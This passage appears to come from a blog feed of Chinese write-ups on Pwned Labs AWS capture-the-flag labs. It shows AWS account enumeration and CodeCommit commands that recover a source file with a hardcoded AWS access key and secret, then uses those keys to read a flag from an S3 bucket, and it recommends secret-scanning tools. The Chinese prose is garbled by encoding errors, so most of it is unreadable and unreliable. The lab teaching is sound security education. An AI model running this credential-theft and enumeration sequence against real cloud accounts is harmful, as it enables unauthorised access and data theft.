ä¸ªè¡¨</td><td>å¯èƒ½åŒ…å«æ•æ„Ÿæ•°æ®</td></tr><tr><td>STS</td><td>æˆåŠŸæšä¸¾ 2&#x2F;2 æ¡ç›®</td><td>å¯ç”¨äºè·å–ä¸´æ—¶å‡­è¯ï¼Œè¿›ä¸€æ­¥æ¨ªå‘ç§»åŠ¨</td></tr><tr><td>Secrets Manager</td><td>å‘ç°ä½†æœªèƒ½æˆåŠŸæšä¸¾</td><td>å¦‚æœå­˜åœ¨å·²é…ç½®çš„ secretsï¼Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„æ¼</td></tr><tr><td>IAM</td><td>æšä¸¾å¤±è´¥ï¼ˆ0&#x2F;20ï¼‰</td><td>è‹¥å­˜åœ¨æƒé™è¿‡åº¦é…ç½®ï¼Œä»æœ‰æ½œåœ¨é£é™©</td></tr><tr><td>S3</td><td>å‘ç° 1 ä¸ªå­˜å‚¨æ¡¶ä½†æœªèƒ½æˆåŠŸæšä¸¾</td><td>æ½œåœ¨æ•æ„Ÿæ–‡ä»¶å…¬å¼€é£é™©</td></tr></tbody></table><p>æ­¤å¤–ï¼Œè¯¥å‘½ä»¤è¿˜ä¼šå°†æšä¸¾çš„ç»“æœè¾“å‡ºåˆ°æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬åç»­éœ€è¦åŸºäºè¿™äº›æ•°æ®è¿›è¡Œåˆ†æã€‚</p><p><img src="/image/image_P5qI5FGF3C.png"></p><p>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨<code>dump</code>å‘½ä»¤æå–å‡º AWS ç¯å¢ƒä¸­å·²æšä¸¾çš„æœåŠ¡å’Œèµ„æºçš„æ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚ä¸<code>enum</code> å‘½ä»¤ä¸åŒçš„æ˜¯ï¼š<code>enum</code> å‘½ä»¤ä»…åˆ—å‡ºæœåŠ¡çš„åŸºç¡€ä¿¡æ¯ä¸åŒï¼Œè€Œ<code>dump</code> å‘½ä»¤ä¼šè¿›ä¸€æ­¥ä»è¿™äº›å·²è¢«æšä¸¾çš„æœåŠ¡å’Œèµ„æºä¸­æå–æ›´è¯¦ç»†çš„æ•°æ®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws-enumerator dump<br></code></pre></td></tr></table></figure><p>å¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬æ‹¥æœ‰<code>ListRepositories</code> æƒé™ï¼Œå¯åˆ—å‡ºå½“å‰è´¦æˆ·ä¸‹æ‰€æœ‰ Code Commit ä»“åº“ã€‚</p><p><img src="/image/image_zuEfQYhkby.png"></p><p>æ ¹æ®æšä¸¾ç»“æœï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªåä¸º<code>vessel-tracking</code>çš„ä»“åº“ã€‚ä½†æˆ‘ä»¬æ— æ³•ç›´æ¥é€šè¿‡<code>git clone</code> å…‹éš†å®ƒï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://git-codecommit.us-east-1.amazonaws.com/v1/repos/vessel-tracking<br></code></pre></td></tr></table></figure><p><img src="/image/image_X4QWS5pdhI.png"></p><h3 id="6-6-æºç ä»“åº“æ¸—é€ä¸å·®å¼‚åˆ†æ"><a href="#6-6-æºç ä»“åº“æ¸—é€ä¸å·®å¼‚åˆ†æ" class="headerlink" title="6.6 æºç ä»“åº“æ¸—é€ä¸å·®å¼‚åˆ†æ"></a>6.6 æºç ä»“åº“æ¸—é€ä¸å·®å¼‚åˆ†æ</h3><p>ç°åœ¨ï¼Œæˆ‘ä»¬çš„ AWS CLI æ‹¥æœ‰äº† AWS çš„ç™»å½•å‡­è¯ã€‚æˆ‘ä»¬å°è¯•ä½¿ç”¨ AWS CLI æ¥æšä¸¾å’Œåˆ†ææ­¤ä»“åº“ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit list-repositories<br></code></pre></td></tr></table></figure><p><img src="/image/image_6zYu8NE6zV.png"></p><p>è¿è¡Œ<code>get-repository</code>åï¼Œä¼šè¿”å›ä»“åº“çš„å…ƒæ•°æ®ï¼ŒåŒ…æ‹¬é»˜è®¤åˆ†æ”¯çš„åç§°ï¼Œå³ <code>master</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-repository --repository-name vessel-tracking<br></code></pre></td></tr></table></figure><p><img src="/image/image_OehSmgM_Gl.png"></p><p>è¿è¡Œ<code>get-repository</code>åï¼Œä¼šè¿”å›æ‰€æœ‰çš„åˆ†æ”¯ä¿¡æ¯ï¼Œè¿™é‡Œå¤šäº†ä¸ªåä¸º <code>dev</code>çš„åˆ†æ”¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit list-branches --repository-name vessel-tracking<br></code></pre></td></tr></table></figure><p><img src="/image/image_wVPjnpg_YB.png"></p><p>æˆ‘ä»¬é‡ç‚¹å…³æ³¨ <code>dev</code> åˆ†æ”¯ï¼Œå¹¶æå–å…¶æäº¤ä¿¡æ¯ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬ä¼šçœ‹åˆ°æœ€æ–°çš„æäº¤ IDï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-branch --repository-name vessel-tracking --branch-name dev<br></code></pre></td></tr></table></figure><p><img src="/image/image_fh2Bx0NIcT.png"></p><p>ä½¿ç”¨<code>get-commit</code>å‘½ä»¤ï¼Œå¹¶é€šè¿‡<code>--commit-id</code>æŒ‡å®šæœ€æ–°çš„æäº¤ IDï¼Œæˆ‘ä»¬å¯ä»¥è·å–å…¶çˆ¶æäº¤<code>parents</code> ä¿¡æ¯ã€‚ä»æäº¤è®°å½•æ¥çœ‹ï¼Œå¼€å‘è€…å¯¹ S3 çš„è°ƒç”¨æ–¹å¼è¿›è¡Œäº†ä¿®æ”¹ï¼Œä½¿å…¶æ›´åŠ é€šç”¨åŒ–ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-commit --repository-name vessel-tracking --commit-id b63f0756ce162a3928c4470681cf18dd2e4e2d5a <br></code></pre></td></tr></table></figure><p><img src="/image/image_tFvPY8r-Iq.png"></p><p>æ¥ä¸‹æ¥ï¼Œä½¿ç”¨<code>get-differences</code>å‘½ä»¤æŸ¥çœ‹è¯¥æäº¤ä¸å…¶çˆ¶æäº¤ä¹‹é—´çš„å…·ä½“å·®å¼‚ã€‚å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š</p><ul><li><code>--before-commit-specifier</code>ï¼šçˆ¶æäº¤çš„ IDã€‚</li><li><code>--after-commit-specifier</code>ï¼šæœ€æ–°çš„æäº¤ IDã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-differences --repository-name vessel-tracking --before-commit-specifier 2272b1b6860912aa3b042caf9ee3aaef58b19cb1 --after-commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a<br></code></pre></td></tr></table></figure><p>ç»“æœæ˜¾ç¤ºï¼Œ<code>js/server.js</code> æ–‡ä»¶è¢«ä¿®æ”¹ã€‚</p><p><img src="/image/image_7_byoSxcNM.png"></p><p>ä½¿ç”¨<code>get-file</code>å‘½ä»¤ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œé…åˆ<code>--file-path</code> å‚æ•°æŒ‡å®šç›®æ ‡è·¯å¾„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws codecommit get-file --repository-name vessel-tracking --commit-specifier b63f0756ce162a3928c4470681cf18dd2e4e2d5a --file-path js/server.js<br></code></pre></td></tr></table></figure><p>è™½ç„¶å‘½ä»¤æˆåŠŸè¿”å›äº†æ–‡ä»¶å†…å®¹ï¼Œä½†å†…å®¹ä¸º Base64 ç¼–ç æ ¼å¼ã€‚</p><p><img src="/image/image_qLJM_B7bc8.png"></p><p>æˆ‘ä»¬å¯ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å°†å…¶è§£ç è¿˜åŸä¸ºåŸå§‹æ–‡æœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&lt;base64&gt;&quot;</span> | <span class="hljs-built_in">base64</span> -d<br></code></pre></td></tr></table></figure><p><img src="/image/image_3qpuRjQWqe.png"></p><p>è¿˜åŸåçš„æ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚åœ¨ä»£ç ä¸­ï¼Œæˆ‘ä»¬æ„å¤–å‘ç°äº†ç¡¬ç¼–ç çš„ AWS å‡­è¯ï¼ŒåŒæ—¶ä¹Ÿçœ‹åˆ°äº†å¯¹åä¸º<code>vessel-tracking</code> çš„ S3 å­˜å‚¨æ¡¶çš„å¼•ç”¨ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">const</span> axios = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;axios&#x27;</span>);<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AWS</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;aws-sdk&#x27;</span>);<br><span class="hljs-keyword">const</span> &#123; <span class="hljs-attr">v4</span>: uuidv4 &#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;uuid&#x27;</span>);<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;dotenv&#x27;</span>).<span class="hljs-title function_">config</span>();<br><br><span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">PORT</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">PORT</span> || <span class="hljs-number">3000</span>;<br><br><span class="hljs-comment">// AWS Setup</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AWS_ACCESS_KEY</span> = <span class="hljs-string">&#x27;AKIA3NRSK2PTLGAWWLTG&#x27;</span>;<br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">AWS_SECRET_KEY</span> = <span class="hljs-string">&#x27;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&#x27;</span>;<br><br><span class="hljs-variable constant_">AWS</span>.<span class="hljs-property">config</span>.<span class="hljs-title function_">update</span>(&#123;<br>    <span class="hljs-attr">region</span>: <span class="hljs-string">&#x27;us-east-1&#x27;</span>,  <span class="hljs-comment">// Change to your region</span><br>    <span class="hljs-attr">accessKeyId</span>: <span class="hljs-variable constant_">AWS_ACCESS_KEY</span>,<br>    <span class="hljs-attr">secretAccessKey</span>: <span class="hljs-variable constant_">AWS_SECRET_KEY</span><br>&#125;);<br><span class="hljs-keyword">const</span> s3 = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">AWS</span>.<span class="hljs-title function_">S3</span>();<br><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// Generate a request ID</span><br>    req.<span class="hljs-property">requestID</span> = <span class="hljs-title function_">uuidv4</span>();<br>    <span class="hljs-title function_">next</span>();<br>&#125;);<br><br><span class="hljs-comment">// åº”ç”¨ vessel-tracking å­˜å‚¨æ¡¶</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/vessel/:mssi&#x27;</span>, <span class="hljs-title function_">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> mssi = req.<span class="hljs-property">params</span>.<span class="hljs-property">mssi</span>;<br><br>        <span class="hljs-comment">// Fetch data from MarineTraffic API</span><br>        <span class="hljs-keyword">let</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`https://api.marinetraffic.com/vessel/<span class="hljs-subst">$&#123;mssi&#125;</span>`</span>, &#123;<br>            <span class="hljs-attr">headers</span>: &#123; <span class="hljs-string">&#x27;Api-Key&#x27;</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">MARINE_API_KEY</span> &#125;<br>        &#125;);<br><br>        <span class="hljs-keyword">let</span> data = response.<span class="hljs-property">data</span>; <span class="hljs-comment">// Modify as per actual API response structure</span><br><br>        <span class="hljs-comment">// Upload to S3</span><br>        <span class="hljs-keyword">let</span> params = &#123;<br>            <span class="hljs-title class_">Bucket</span>: <span class="hljs-string">&#x27;vessel-tracking&#x27;</span>,<br>            <span class="hljs-title class_">Key</span>: <span class="hljs-string">`<span class="hljs-subst">$&#123;mssi&#125;</span>.json`</span>,<br>            <span class="hljs-title class_">Body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data),<br>            <span class="hljs-title class_">ContentType</span>: <span class="hljs-string">&quot;application/json&quot;</span><br>        &#125;;<br><br>        s3.<span class="hljs-title function_">putObject</span>(params, <span class="hljs-keyword">function</span> (<span class="hljs-params">err, s3data</span>) &#123;<br>            <span class="hljs-keyword">if</span> (err) <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(err);<br>            <br>            <span class="hljs-comment">// Send data to frontend</span><br>            res.<span class="hljs-title function_">json</span>(&#123;<br>                data,<br>                <span class="hljs-attr">requestID</span>: req.<span class="hljs-property">requestID</span><br>            &#125;);<br>        &#125;);<br><br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>        res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&quot;Error fetching vessel data.&quot;</span> &#125;);<br>    &#125;<br>&#125;);<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-variable constant_">PORT</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Server is running on PORT <span class="hljs-subst">$&#123;PORT&#125;</span>`</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="6-7-ææƒä»¥è®¿é—®æ•æ„Ÿæ•°æ®"><a href="#6-7-ææƒä»¥è®¿é—®æ•æ„Ÿæ•°æ®" class="headerlink" title="6.7 ææƒä»¥è®¿é—®æ•æ„Ÿæ•°æ®"></a>6.7 ææƒä»¥è®¿é—®æ•æ„Ÿæ•°æ®</h3><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ–°è·å¾—çš„å¯†é’¥é…ç½® AWS CLIï¼Œå®Œæˆèº«ä»½åˆ‡æ¢ï¼Œæ­¤æ—¶æˆ‘ä»¬æ‹¥æœ‰çš„æ˜¯<strong>ä»£ç ç®¡ç†å‘˜æƒé™</strong>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws configure<br>aws sts get-caller-identity <br></code></pre></td></tr></table></figure><p><img src="/image/image_X1eVUOyEns.png"></p><p>æœ€åä¸€æ­¥ï¼Œåˆ—å‡º<code>vessel-tracking</code>å­˜å‚¨æ¡¶ä¸­çš„æ–‡ä»¶ï¼Œå¹¶è¯»å–å…¶ä¸­çš„ flagï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> vessel-tracking<br>aws s3 <span class="hljs-built_in">cp</span> s3://vessel-tracking/flag.txt .<br></code></pre></td></tr></table></figure><p><img src="/image/image_GmLI9tBKYQ.png"></p><h2 id="0x07-æ€»ç»“"><a href="#0x07-æ€»ç»“" class="headerlink" title="0x07 æ€»ç»“"></a>0x07 æ€»ç»“</h2><p>æ— è®ºæ˜¯ä½œä¸ºæ”»å‡»è€…ã€é˜²å¾¡è€…è¿˜æ˜¯ DevOps ä¸“ä¸šäººå‘˜ï¼Œä¸»åŠ¨å‘ç°å¯èƒ½è¢«æ·»åŠ åˆ°èµ„æºä¸­çš„ secret éƒ½æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„åšæ³•ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <a href="https://github.com/trufflesecurity/trufflehog/" title="Trufflehog">Trufflehog</a> å·¥å…·æ‰«æ Docker å®¹å™¨ä¸­æ˜¯å¦å­˜åœ¨æ•æ„Ÿä¿¡æ¯ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">trufflehog docker --image hljose/huge-logistics-terraform-runner:0.12<br><br></code></pre></td></tr></table></figure><p><img src="/image/image_2TPqnPP2h4.png"></p><p>æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ trivy æ‰«æé•œåƒä¸­çš„æ¼æ´ã€é”™è¯¯é…ç½®ã€secret å’Œ è®¸å¯è¯ï¼ˆtrivy é»˜è®¤åªæ‰«ææ¼æ´å’Œ secretï¼Œå› æ­¤æ¨èä½¿ç”¨ <code>--scanners</code> æŒ‡å®šæ‰€æœ‰çš„æ‰«æç±»å‹ï¼‰ã€‚</p><p><img src="/image/image_IchtDm0lu3.png"></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œè¯¥æ¼æ´åŒ…å« 135 ä¸ªæ¼æ´ã€‚</p><p><img src="/image/image_lDdoOEf49C.png"></p><p>trivy è¿˜å¯ä»¥ä» <code>Env</code> å’Œ <code>History</code> ä¸­æ‰«æå‡º secretï¼Œæ¯” trufflehog å¼ºçš„æ˜¯ï¼Œtrivy å¯ä»¥æ‰«æå‡º Secret Access Keyï¼ˆå½“ç„¶ï¼Œè¿™å…¶ä¸­è¿˜éœ€è¦å»é‡ï¼‰ã€‚</p><p><img src="/image/image_1RCAaxaMHp.png"></p><p>æ­¤å¤–ï¼ŒTrivy è¿˜å¯ä»¥æ‰«æè½¯ä»¶åŒ…ä¸­çš„è®¸å¯è¯ï¼Œå¯ä»¥å¸®æˆ‘ä»¬é¿å…ä¸€äº›åˆè§„æ–¹é¢çš„é£é™©ï¼Œååˆ†æ¨èã€‚</p><p><img src="/image/image_nqUs0EdNHS.png"></p><p>æœ€åï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨ AWS Labs å›¢é˜Ÿæä¾›çš„<a href="https://github.com/awslabs/git-secrets" title="git-secrets ">git-secrets</a>å·¥å…·ï¼Œä»¥é˜²æ­¢å¯†ç å’Œå…¶ä»–æ•æ„Ÿä¿¡æ¯è¢«æäº¤åˆ° Git ä»“åº“ä¸­ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>AWS å®‰å…¨</tag>
      
      <tag>å®¹å™¨å®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AWS S3 Enumeration Basicsï¼šAWS S3 æšä¸¾åŸºç¡€çŸ¥è¯†</title>
    <link href="/2025/05/01/%E3%80%90Pwned-Labs%E3%80%91AWS-S3-Enumeration-Basics%EF%BC%9AAWS-S3-%E6%9E%9A%E4%B8%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2025/05/01/%E3%80%90Pwned-Labs%E3%80%91AWS-S3-Enumeration-Basics%EF%BC%9AAWS-S3-%E6%9E%9A%E4%B8%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-åœºæ™¯ä»‹ç»"><a href="#0x00-åœºæ™¯ä»‹ç»" class="headerlink" title="0x00 åœºæ™¯ä»‹ç»"></a>0x00 åœºæ™¯ä»‹ç»</h2><p>è¿™æ˜¯ä½ ä½œä¸ºçº¢é˜Ÿæˆå‘˜çš„ç¬¬ä¸€å¤©ï¼Œä½ çš„ä»»åŠ¡æ˜¯æ£€æŸ¥ä¸€ä¸ªåœ¨è¢«é’“é±¼å‘˜å·¥çš„ä¹¦ç­¾ä¸­å‘ç°çš„ç½‘ç«™ã€‚</p><p>å»çœ‹çœ‹å®ƒä¼šå¼•å¯¼ä½ åˆ°å“ªé‡Œï¼èŒƒå›´åŒ…æ‹¬è¯¥å…¬å¸çš„åŸºç¡€è®¾æ–½ï¼ŒåŒ…æ‹¬äº‘æœåŠ¡ã€‚</p><blockquote><p><strong>ğŸ¯ ç‚¹å‡»ã€é˜…è¯»åŸæ–‡ã€‘ï¼Œç«‹å³è¿›å…¥é¶åœºç¯å¢ƒï¼</strong></p></blockquote><h2 id="0x01-å‰ç½®çŸ¥è¯†"><a href="#0x01-å‰ç½®çŸ¥è¯†" class="headerlink" title="0x01 å‰ç½®çŸ¥è¯†"></a>0x01 å‰ç½®çŸ¥è¯†</h2><ul><li>åŸºæœ¬çš„ Linux å‘½ä»¤è¡ŒçŸ¥è¯†</li></ul><h2 id="0x02-å­¦ä¹ ç›®æ ‡"><a href="#0x02-å­¦ä¹ ç›®æ ‡" class="headerlink" title="0x02 å­¦ä¹ ç›®æ ‡"></a>0x02 å­¦ä¹ ç›®æ ‡</h2><ul><li>ç†Ÿæ‚‰ AWS CLIï¼ˆå‘½ä»¤è¡Œç•Œé¢ï¼‰</li><li>åŸºç¡€çš„ S3 æšä¸¾å’Œå‡­è¯çªƒå–</li><li>äº†è§£å¦‚ä½•é˜²èŒƒæ­¤ç±»åœºæ™¯</li></ul><h2 id="0x03-éš¾åº¦ç­‰çº§"><a href="#0x03-éš¾åº¦ç­‰çº§" class="headerlink" title="0x03 éš¾åº¦ç­‰çº§"></a>0x03 éš¾åº¦ç­‰çº§</h2><ul><li>åˆçº§ï¼ˆBeginnerï¼‰</li></ul><h2 id="0x04-å…³æ³¨é‡ç‚¹"><a href="#0x04-å…³æ³¨é‡ç‚¹" class="headerlink" title="0x04 å…³æ³¨é‡ç‚¹"></a>0x04 å…³æ³¨é‡ç‚¹</h2><ul><li>çº¢é˜Ÿï¼ˆRedï¼‰</li></ul><h2 id="0x05-çœŸå®èƒŒæ™¯"><a href="#0x05-çœŸå®èƒŒæ™¯" class="headerlink" title="0x05 çœŸå®èƒŒæ™¯"></a>0x05 çœŸå®èƒŒæ™¯</h2><p>Amazon S3ï¼ˆç®€å•å­˜å‚¨æœåŠ¡ï¼‰æ˜¯ä¸€ä¸ªéå¸¸æµè¡Œçš„ AWS æœåŠ¡ï¼ˆä¹Ÿæ˜¯ç¬¬äºŒå¤è€çš„æœåŠ¡ï¼‰ï¼Œç”¨äºå­˜å‚¨æ–‡ä»¶å’Œå¤‡ä»½ï¼Œç”šè‡³å¯ä»¥ç”¨æ¥æ‰˜ç®¡ç½‘ç«™ã€‚</p><p>è¿™ç§å¤šåŠŸèƒ½æ€§è®©ä¸€äº›äººè®¤ä¸ºï¼Œå¦‚æœå°†å…¶åˆ†ä¸ºå…¬æœ‰ç½‘ç«™æ‰˜ç®¡å’Œç§æœ‰æ–‡ä»¶å­˜å‚¨ä¸¤ä¸ªç‹¬ç«‹æœåŠ¡ï¼Œå¯èƒ½ä¼šæ›´å®‰å…¨ã€‚</p><p>è¿‘å¹´æ¥ï¼ŒAWS åœ¨ç”¨æˆ·è®¾ç½®å­˜å‚¨æ¡¶ä¸ºâ€œå…¨ç½‘å¯è¯»â€æ—¶ï¼Œå¼•å…¥äº†æ›´å¤šçš„å¯è§†åŒ–è­¦å‘Šï¼Œä½†åªè¦è¿™ä¸ªé€‰é¡¹è¿˜åœ¨ï¼Œå°±æ€»æœ‰äººä¼šä½¿ç”¨å®ƒï¼å¤šå¹´æ¥ï¼ŒS3 çš„é…ç½®é”™è¯¯å’Œæƒé™è¿‡å®½å·²ç»å¯¼è‡´äº†è®¸å¤šæ•°æ®æ³„éœ²äº‹ä»¶ã€‚</p><h2 id="0x06-è§£é¢˜æ€è·¯"><a href="#0x06-è§£é¢˜æ€è·¯" class="headerlink" title="0x06 è§£é¢˜æ€è·¯"></a>0x06 è§£é¢˜æ€è·¯</h2><h3 id="6-1-åˆæ­¥åˆ†æ"><a href="#6-1-åˆæ­¥åˆ†æ" class="headerlink" title="6.1 åˆæ­¥åˆ†æ"></a>6.1 åˆæ­¥åˆ†æ</h3><p>æ‰“å¼€é¢˜ç›®æ‰€æä¾›çš„ç½‘ç«™è¿›è¡Œæ£€æŸ¥ï¼Œä»å®‰å…¨çš„è§’åº¦æ¥è¯´ï¼Œå¹¶æœªå‘ç°ä»€ä¹ˆç‰¹åˆ«çš„åœ°æ–¹ã€‚</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">http://dev.huge-logistics.com<br></code></pre></td></tr></table></figure><p><img src="/image/image_I23P_msSDm.png"></p><p>æ£€æŸ¥ä¸€ä¸‹ç½‘ç«™çš„æºç ã€‚è¿™æ—¶ï¼Œæˆ‘ä»¬å‘ç°ç½‘ç«™çš„å›¾ç‰‡ã€CSS å’Œ Java Script ç­‰é™æ€æ–‡ä»¶éƒ½è¢«å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º<code>dev.huge-logistics.com</code> çš„ S3 å­˜å‚¨æ¡¶ä¸­ã€‚</p><p><img src="/image/image_hmGWMUYG7h.png"></p><p>S3 å­˜å‚¨æ¡¶æ˜¯äºšé©¬é€Šç®€å•å­˜å‚¨æœåŠ¡ï¼ˆAmazonâ€™s <strong>S</strong>imple <strong>S</strong>torage <strong>S</strong>erviceï¼‰ä¸Šçš„å­˜å‚¨å®¹å™¨ï¼Œæˆ‘ä»¬å¯ä»¥å°†æ–‡ä»¶å’Œå›¾ç‰‡ç­‰æ•°æ®å­˜å‚¨äºå…¶ä¸­ã€‚æˆ‘ä»¬å¯ä»¥å°†å…¶ç†è§£ä¸ºè®¡ç®—æœºä¸Šçš„æ–‡ä»¶å¤¹ï¼Œä¸åŒçš„æ˜¯å®ƒå¯ä»¥åœ¨çº¿è¿›è¡Œè®¿é—®ï¼Œå¹¶ä¸”å¯ä»¥å­˜å‚¨å¤§é‡çš„æ•°æ®ã€‚</p><h3 id="6-2-S3-å­˜å‚¨æ¡¶æƒé™åˆ†æ"><a href="#6-2-S3-å­˜å‚¨æ¡¶æƒé™åˆ†æ" class="headerlink" title="6.2 S3 å­˜å‚¨æ¡¶æƒé™åˆ†æ"></a>6.2 S3 å­˜å‚¨æ¡¶æƒé™åˆ†æ</h3><p>æˆ‘ä»¬å°è¯•åœ¨æµè§ˆå™¨ä¸­å¯¼èˆªåˆ°å…¶ä¸­ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åè¿›è¡Œç›®å½•éå†ï¼Œçœ‹çœ‹æ˜¯å¦å¯ä»¥åˆ—å‡ºå­˜å‚¨æ¡¶ä¸­çš„å…¶å®ƒèµ„æºã€‚</p><p>å½“æˆ‘ä»¬è®¿é—®ä»¥ä¸‹é“¾æ¥æ—¶ï¼Œå®ƒä¼šä¸‹è½½ä¸€ä¸ªå¤§å°ä¸º 0 çš„æ–‡ä»¶ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">https://s3.amazonaws.com/dev.huge-logistics.com/static/<br></code></pre></td></tr></table></figure><p><img src="/image/image_w5ksXUX4-Z.png"></p><p>è®¿é—®ä»¥ä¸‹é“¾æ¥æ—¶ï¼Œè®¿é—®è¢«æ‹’ç»ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 